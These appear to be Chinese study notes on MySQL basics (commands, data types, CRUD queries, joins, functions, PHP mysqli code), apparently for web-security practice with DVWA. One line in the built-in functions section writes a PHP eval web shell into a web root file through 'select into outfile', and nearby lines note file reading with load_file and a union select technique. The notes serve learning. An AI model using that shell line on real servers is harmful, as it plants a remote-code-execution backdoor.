设置mysql密码

```mysql
>use mysql;
>update user set password=password('root') where user='root' and host='localhost';
>flush privileges;
```

# 常用命令

> show databases;
>
> set names utf8;
>
> use dvwa;
>
> show tables;
>
> create database test001;
>
> drop database test001;
>
> desc 表名;
>
> show create table 表名;	#查看表详情

# mysql数据类型

一些测试

![image-20221209101123180](./image/image-20221209101123180.png)

![image-20221209101308437](./image/image-20221209101308437.png)

字符串类型char（定长）、varchar（变长）

![image-20221209101936886](./image/image-20221209101936886.png)

![image-20221209101827891](./image/image-20221209101827891.png)

约束条件

![image-20221209104407473](./image/image-20221209104407473.png)

添加/删除表列语法

![image-20221209104531853](./image/image-20221209104531853.png)         

# 增删改查

## 创建数据库、表

创建数据库编码格式为utf8，创建表格，输入汉字字符

```mysql
create database test002 charset="utf8";
create table t1(
	id  int primary key auto_increment,
	name char(10),
	address varchar(200)
);
```

![image-20211215183333438](./image/image-20211215183333438.png)

![image-20211215183402816](./image/image-20211215183402816.png)

## Insert

![image-20211215230958801](./image/image-20211215230958801.png)

## Delete

![image-20211215231341493](./image/image-20211215231341493.png)

![image-20220602011513451](./image/image-20220602011513451.png)

delete from admin where password like '%fad%';

![image-20220602011530735](./image/image-20220602011530735.png)



## Update

![image-20211215231349944](./image/image-20211215231349944.png)

![image-20211215231402294](./image/image-20211215231402294.png)

## Select

构造数据

![image-20211215231429335](./image/image-20211215231429335.png)

```mysql
#创建数据库，设置编码格式
create database test002 charset="utf8";

#1、创建student表
create table student(
	id int not null primary key auto_increment,
	name varchar(10) not null,
	age int not null,
	classId int not null
);

#插入数据
insert into student(name,age,classId) values("诸葛亮",21,2),("诸葛谨",22,3),("张飞",34,2),("赵云",36,2),("张辽",42,1),("周瑜",21,3),("关羽",36,2),("曹操",59,1),("陈宫",61,5),("夏侯渊",50,2),("孙权",51,3);


#2、创建class表
create table class(
	id int not null primary key auto_increment,
	className varchar(10) not null
);

#插入数据
insert into class(className) values("魏国"),("蜀国"),("吴国");
```

select基本查询

![image-20211215231410956](./image/image-20211215231410956.png)

where子句

![image-20221209121254467](./image/image-20221209121254467.png)

like

![image-20221209121548086](./image/image-20221209121548086.png)

分组查询group by

![image-20221209121819714](./image/image-20221209121819714.png)

order by 排序

> mysql> select * from student order by age desc;	#desc这里表示倒序排列

![image-20221209123712982](./image/image-20221209123712982.png)

having 分组条件，之前一定有group by

![image-20211215232010558](./image/image-20211215232010558.png)

limit 翻页 推荐

> limit 3	#取出前三个
>
> limit 1,3 #从第二个开始取3个

join	连接查询

left join 依左边为基准

right join 依右边为基准

![image-20221209151609752](./image/image-20221209151609752.png)

in	属于 ***范围内

字段 exist 1	#条件满足，执行

not exist 0



union	联合查询

字段必须一致

> mysql> select name,age from student union select 1,2;

![image-20221209152512489](./image/image-20221209152512489.png)

# 常用函数

floor()	#向下取整

![image-20221209153407486](./image/image-20221209153407486.png)

rand()	#返回0-1之间随机数

left()	取左边

right()	取右边

![image-20221209153542215](./image/image-20221209153542215.png)

position()	#查询所在位置

![image-20221209153638878](./image/image-20221209153638878.png)

取一个1-10之间的随机数：

> mysql> select floor(rand()*10)+1;



# 内置函数

![image-20211215232656451](./image/image-20211215232656451.png)

![image-20211215232703226](./image/image-20211215232703226.png)

load_file()	#文件读取

select into outfile	#文件写入

> select '<?php @eval($_POST[1]);?>' into outfile 'C:/phpStudy/WWW/shell.php'



# PHP+Mysql

mysqli_connect()	#数据库连接函数

> $link = @mysqli_connect("127.0.0.1","root","","test002");	//加@符可以隐藏错误

mysqli_query()	#执行sql语句，对数据库执行一次查询

![image-20221209160036433](./image/image-20221209160036433.png)

mysqli_fetch_assoc()	#从结果集中取得一行作为关联数组

![image-20221209161425531](./image/image-20221209161425531.png)

![image-20221209161442755](./image/image-20221209161442755.png)



![image-20211215232830688](./image/image-20211215232830688.png)



![image-20211215232845691](./image/image-20211215232845691.png)
![image-20211215232854412](./image/image-20211215232854412.png)![image-20211215232907705](./image/image-20211215232907705.png)



```php
<?php 

	header("Content-Type:text/html;charset=utf-8");
	// error_reporting(0);
	$link = @mysqli_connect("127.0.0.1","root","","test002");	//加@符可以隐藏错误
	// var_dump($link);

	if (!$link) {
		echo "数据库连接失败<br />";
		exit();
	}
	mysqli_query($link,"set names utf8");


	//查询操作
	$sql = "select * from student";
	$result = mysqli_query($link,$sql);
	// var_dump($result);
	// var_dump(mysqli_fetch_assoc($result));
	while ($row = mysqli_fetch_assoc($result)) {
		echo $row["id"]."---".$row["name"]."---".$row["age"]."<br />";
	}


	//增加
	$sql = "insert into student(name,age,classId) values('许攸',34,4)";
	$res = mysqli_query($link,$sql);
	//var_dump($res);


	//删除
	$sql = "delete from student where id > 25";
	$res = mysqli_query($link,$sql);
	// var_dump($res);

	$num = mysqli_affected_rows($link);
	var_dump($num);



	//修改
	$sql = "update student set age=18 where id=20";
	$res = mysqli_query($link,$sql);
	var_dump($res);

	$num = mysqli_affected_rows($link);
	var_dump($num);
```

# 数据库导出

![image-20211215233331893](./image/image-20211215233331893.png)

# 数据库导入

![image-20211215233415092](./image/image-20211215233415092.png)

![image-20211215233436756](./image/image-20211215233436756.png)

![image-20211215233443768](./image/image-20211215233443768.png)

